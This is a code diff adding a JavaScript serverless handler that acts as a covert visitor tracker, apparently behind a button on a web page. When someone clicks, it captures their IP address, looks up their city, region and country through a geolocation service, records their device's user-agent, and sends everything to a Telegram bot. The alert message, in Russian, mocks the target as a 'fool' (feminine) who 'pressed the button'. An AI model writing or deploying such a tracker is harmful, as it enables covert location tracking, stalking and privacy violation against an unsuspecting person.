@@ -1,0 +1,42 @@
+export default async function handler(req, res) {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!token || !chatId) {
+    return res.status(500).json({ error: "No token" });
+  }
+
+  // Получаем IP
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
+             req.headers['x-real-ip'] || 
+             req.connection.remoteAddress || 'Unknown';
+
+  // Геолокация
+  let city = '', region = '', country = 'DE';
+  try {
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geo = await geoRes.json();
+    city = geo.city || '';
+    region = geo.region || '';
+    country = geo.country_name || 'DE';
+  } catch (e) {}
+
+  const time = new Date().toISOString().replace('T', ' ').slice(0, 19) + " UTC";
+  const device = req.headers['user-agent'] || 'Unknown';
+
+  const message = `🔔 ДУРА НАЖАЛА КНОПКУ!!!\n\n` +
+                  `🕒 Время: ${time}\n` +
+                  `🌐 IP: ${ip}\n` +
+                  `📍 Гео: ${city}, ${region}, ${country}\n` +
+                  `💻 Устройство: ${device}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    });
+  } catch (e) {}
+
+  res.status(200).json({ status: 'ok' });
+}
